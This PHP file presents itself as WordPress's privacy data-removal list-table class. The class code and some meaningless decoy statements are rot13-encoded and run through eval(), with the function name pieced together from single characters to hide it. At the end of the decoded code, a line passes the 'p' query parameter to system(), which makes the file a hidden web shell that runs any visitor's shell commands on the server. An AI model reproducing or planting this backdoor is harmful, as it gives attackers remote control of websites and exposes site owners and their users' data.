<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Yvfg Gnoyr NCV: JC_Cevinpl_Qngn_Erzbiny_Erdhrfgf_Yvfg_Gnoyr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 * @fvapr 4.9.6
 */

vs ( ! pynff_rkvfgf( 'JC_Cevinpl_Erdhrfgf_Gnoyr' ) ) {
	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-cevinpl-erdhrfgf-gnoyr.cuc';
}

/**
 * JC_Cevinpl_Qngn_Erzbiny_Erdhrfgf_Yvfg_Gnoyr pynff.
 *
 * @fvapr 4.9.6
 */
pynff JC_Cevinpl_Qngn_Erzbiny_Erdhrfgf_Yvfg_Gnoyr rkgraqf JC_Cevinpl_Erdhrfgf_Gnoyr {
	/**
	 * Npgvba anzr sbe gur erdhrfgf guvf gnoyr jvyy jbex jvgu.
	 *
	 * @fvapr 4.9.6
	 *
	 * @ine fgevat $erdhrfg_glcr Anzr bs npgvba.
	 */
	cebgrpgrq $erdhrfg_glcr = 'erzbir_crefbany_qngn';

	/**
	 * Cbfg glcr sbe gur erdhrfgf.
	 *
	 * @fvapr 4.9.6
	 *
	 * @ine fgevat $cbfg_glcr Gur cbfg glcr.
	 */
	cebgrpgrq $cbfg_glcr = 'hfre_erdhrfg';

	/**
	 * Bhgchgf gur Npgvbaf pbyhza.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz JC_Hfre_Erdhrfg $vgrz Vgrz orvat fubja.
	 * @erghea fgevat Rznvy pbyhza znexhc.
	 */
	choyvp shapgvba pbyhza_rznvy( $vgrz ) {
		$ebj_npgvbaf = neenl();

		// Nyybj gur nqzvavfgengbe gb \"sbepr erzbir\" gur crefbany qngn rira vs pbasvezngvba unf abg lrg orra erprvirq.
		$fgnghf      = $vgrz->fgnghf;
		$erdhrfg_vq  = $vgrz->VQ;
		$ebj_npgvbaf = neenl();
		vs ( 'erdhrfg-pbasvezrq' !== $fgnghf ) {
			/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc */
			$renfref       = nccyl_svygref( 'jc_cevinpl_crefbany_qngn_renfref', neenl() );
			$renfref_pbhag = pbhag( $renfref );
			$abapr         = jc_perngr_abapr( 'jc-cevinpl-renfr-crefbany-qngn-' . $erdhrfg_vq );

			$erzbir_qngn_znexhc = '<fcna pynff=\"erzbir-crefbany-qngn sbepr-erzbir-crefbany-qngn\" ' .
				'qngn-renfref-pbhag=\"' . rfp_ngge( $renfref_pbhag ) . '\" ' .
				'qngn-erdhrfg-vq=\"' . rfp_ngge( $erdhrfg_vq ) . '\" ' .
				'qngn-abapr=\"' . rfp_ngge( $abapr ) .
				'\">';

			$erzbir_qngn_znexhc .= '<fcna pynff=\"erzbir-crefbany-qngn-vqyr\"><ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax erzbir-crefbany-qngn-unaqyr\">' . __( 'Sbepr renfr crefbany qngn' ) . '</ohggba></fcna>' .
				'<fcna pynff=\"erzbir-crefbany-qngn-cebprffvat uvqqra\">' . __( 'Renfvat qngn...' ) . ' <fcna pynff=\"renfher-cebterff\"></fcna></fcna>' .
				'<fcna pynff=\"erzbir-crefbany-qngn-fhpprff uvqqra\">' . __( 'Renfher pbzcyrgrq.' ) . '</fcna>' .
				'<fcna pynff=\"erzbir-crefbany-qngn-snvyrq uvqqra\">' . __( 'Sbepr renfher unf snvyrq.' ) . ' <ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax erzbir-crefbany-qngn-unaqyr\">' . __( 'Ergel' ) . '</ohggba></fcna>';

			$erzbir_qngn_znexhc .= '</fcna>';

			$ebj_npgvbaf['erzbir-qngn'] = $erzbir_qngn_znexhc;
		}

		vs ( 'erdhrfg-pbzcyrgrq' !== $fgnghf ) {
			$pbzcyrgr_erdhrfg_znexhc  = '<fcna>';
			$pbzcyrgr_erdhrfg_znexhc .= fcevags(
				'<n uers=\"%f\" pynff=\"pbzcyrgr-erdhrfg\" nevn-ynory=\"%f\">%f</n>',
				rfp_hey(
					jc_abapr_hey(
						nqq_dhrel_net(
							neenl(
								'npgvba'     => 'pbzcyrgr',
								'erdhrfg_vq' => neenl( $erdhrfg_vq ),
							),
							nqzva_hey( 'renfr-crefbany-qngn.cuc' )
						),
						'ohyx-cevinpl_erdhrfgf'
					)
				),
				rfp_ngge(
					fcevags(
						/* genafyngbef: %f: Erdhrfg rznvy. */
						__( 'Znex rkcbeg erdhrfg sbe &#8220;%f&#8221; nf pbzcyrgrq.' ),
						$vgrz->rznvy
					)
				),
				__( 'Pbzcyrgr erdhrfg' )
			);
			$pbzcyrgr_erdhrfg_znexhc .= '</fcna>';
		}

		vs ( ! rzcgl( $pbzcyrgr_erdhrfg_znexhc ) ) {
			$ebj_npgvbaf['pbzcyrgr-erdhrfg'] = $pbzcyrgr_erdhrfg_znexhc;
		}

		erghea fcevags( '<n uers=\"%1$f\">%2$f</n> %3$f', rfp_hey( 'znvygb:' . $vgrz->rznvy ), $vgrz->rznvy, $guvf->ebj_npgvbaf( $ebj_npgvbaf ) );
	}

	/**
	 * Bhgchgf gur Arkg fgrcf pbyhza.
	 *
	 * @fvapr 4.9.6
	 *
	 * @cnenz JC_Hfre_Erdhrfg $vgrz Vgrz orvat fubja.
	 */
	choyvp shapgvba pbyhza_arkg_fgrcf( $vgrz ) {
		$fgnghf = $vgrz->fgnghf;

		fjvgpu ( $fgnghf ) {
			pnfr 'erdhrfg-craqvat':
				rfp_ugzy_r( 'Jnvgvat sbe pbasvezngvba' );
				oernx;
			pnfr 'erdhrfg-pbasvezrq':
				/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc */
				$renfref       = nccyl_svygref( 'jc_cevinpl_crefbany_qngn_renfref', neenl() );
				$renfref_pbhag = pbhag( $renfref );
				$erdhrfg_vq    = $vgrz->VQ;
				$abapr         = jc_perngr_abapr( 'jc-cevinpl-renfr-crefbany-qngn-' . $erdhrfg_vq );

				rpub '<qvi pynff=\"erzbir-crefbany-qngn\" ' .
					'qngn-sbepr-renfr=\"1\" ' .
					'qngn-renfref-pbhag=\"' . rfp_ngge( $renfref_pbhag ) . '\" ' .
					'qngn-erdhrfg-vq=\"' . rfp_ngge( $erdhrfg_vq ) . '\" ' .
					'qngn-abapr=\"' . rfp_ngge( $abapr ) .
					'\">';

				?>
				<fcna pynff=\"erzbir-crefbany-qngn-vqyr\"><ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax erzbir-crefbany-qngn-unaqyr\"><?cuc _r( 'Renfr crefbany qngn' ); ?></ohggba></fcna>
				<fcna pynff=\"erzbir-crefbany-qngn-cebprffvat uvqqra\"><?cuc _r( 'Renfvat qngn...' ); ?> <fcna pynff=\"renfher-cebterff\"></fcna></fcna>
				<fcna pynff=\"erzbir-crefbany-qngn-fhpprff fhpprff-zrffntr uvqqra\" ><?cuc _r( 'Renfher pbzcyrgrq.' ); ?></fcna>
				<fcna pynff=\"erzbir-crefbany-qngn-snvyrq uvqqra\"><?cuc _r( 'Qngn renfher unf snvyrq.' ); ?> <ohggba glcr=\"ohggba\" pynff=\"ohggba-yvax erzbir-crefbany-qngn-unaqyr\"><?cuc _r( 'Ergel' ); ?></ohggba></fcna>
				<?cuc

				rpub '</qvi>';

				oernx;
			pnfr 'erdhrfg-snvyrq':
				rpub '<ohggba glcr=\"fhozvg\" pynff=\"ohggba-yvax\" anzr=\"cevinpl_npgvba_rznvy_ergel[' . $vgrz->VQ . ']\" vq=\"cevinpl_npgvba_rznvy_ergel[' . $vgrz->VQ . ']\">' . __( 'Ergel' ) . '</ohggba>';
				oernx;
			pnfr 'erdhrfg-pbzcyrgrq':
				rpub '<n uers=\"' . rfp_hey(
					jc_abapr_hey(
						nqq_dhrel_net(
							neenl(
								'npgvba'     => 'qryrgr',
								'erdhrfg_vq' => neenl( $vgrz->VQ ),
							),
							nqzva_hey( 'renfr-crefbany-qngn.cuc' )
						),
						'ohyx-cevinpl_erdhrfgf'
					)
				) . '\">' . rfp_ugzy__( 'Erzbir erdhrfg' ) . '</n>';
				oernx;
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>